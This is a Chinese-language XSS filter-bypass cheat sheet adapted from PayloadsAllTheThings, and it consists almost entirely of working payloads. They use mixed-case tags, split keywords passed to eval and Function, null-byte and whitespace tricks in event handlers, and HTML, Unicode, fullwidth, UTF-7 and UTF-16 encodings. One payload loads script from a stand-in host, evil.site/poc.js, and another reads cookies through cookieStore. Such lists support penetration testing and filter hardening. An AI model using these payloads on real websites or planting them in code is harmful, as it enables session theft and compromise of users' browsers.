# XSS Filter Bypass - XSS过滤器绕过

[SEARCH_KEYWORDS]
漏洞类型: XSS Cross-Site Scripting 过滤器绕过
绕过技术: Case Sensitive Tag Blacklist Word Blacklist Space Filter Quotes Filter
编码: HTML Encoding Unicode UTF-7 UTF-8 UTF-16 UTF-32 BOM JSFuck
特殊字符: Null Byte Vertical Tab Carriage Return Line Feed
事件绕过: onxxxx Blacklist onerror onload onclick

[CONTENT]

## 大小写绕过

混合大小写绕过大小写敏感的过滤器：

```html
<sCrIpt>alert(1)</ScRipt>
<ScrIPt>alert(1)</ScRipT>
```

## 标签黑名单绕过

```html
<script x>
<script x>alert('XSS')<script y>
```

## 关键词黑名单绕过

使用代码评估绕过关键词过滤：

```javascript
eval('ale'+'rt(0)');
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Set.constructor('ale'+'rt(13)')();
```

## 不完整HTML标签

适用于 IE/Firefox/Chrome/Safari：

```html
<img src='1' onerror='alert(0)' <
```

## 引号绕过

```javascript
// 字符串函数
String.fromCharCode(88,83,83)

// 模板字符串
alert`1`
setTimeout`alert\u0028document.domain\u0029`;
```

## 事件处理器绕过

### 使用少见标签
```html
<object onafterscriptexecute=confirm(0)>
<object onbeforescriptexecute=confirm(0)>
```

### 空字节/特殊字符
```html
<img src='1' onerror\x00=alert(0) />
<img src='1' onerror\x0b=alert(0) />
<img src='1' onerror\x0d=alert(0) />
<img src='1' onerror\x0a=alert(0) />
```

### 斜杠绕过
```html
<img src='1' onerror/=alert(0) />
```

## 空格绕过

### 斜杠替代
```html
<img/src='1'/onerror=alert(0)>
```

### 特殊字符
```html
<svgonload=alert(1)>
```

## 文档对象绕过

```javascript
<div id = "x"></div><script>alert(x.parentNode.parentNode.parentNode.location)</script>
window["doc"+"ument"]
```

### Cookie访问绕过 (Chrome/Edge/Opera)
```javascript
window.cookieStore.get('COOKIE_NAME').then((cookieValue)=>{alert(cookieValue.value);});
```

## 编码绕过

### HTML编码
```html
%26%2397;lert(1)
&#97;&#108;&#101;&#114;&#116;
</script><svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)>
```

### Unicode绕过

| Unicode | ASCII |
|---------|-------|
| `\u0061` | a |
| `\u006C` | l |
| `\u0065` | e |
| `\u0072` | r |
| `\u0074` | t |

```html
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
```

### 宽字符绕过

| Unicode | 转换 | 字符 |
|---------|------|------|
| `\uFF1C` | LESS-THAN | < |
| `\uFF1E` | GREATER-THAN | > |
| `\u02BA` | QUOTATION MARK | " |
| `\u02B9` | APOSTROPHE | ' |

```html
＜script/src=//evil.site/poc.js＞
ʺ＞＜svg onload=alert(/XSS/)＞/
```

### UTF-7编码
```html
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-
```

### UTF-16编码
```html
%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E%00
```

## 变体执行方法

### 替代alert
```javascript
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)

[7].map(alert)
[8].find(alert)
[9].every(alert)
```

### 全局变量索引
```javascript
c=0; for(i in self) { if(i == "alert") { console.log(c); } c++; }
// 找到alert的索引
self[Object.keys(self)[5]]("1") // alert("1")
```

## 参考文档

原始来源: PayloadsAllTheThings/XSS Injection/1 - XSS Filter Bypass.md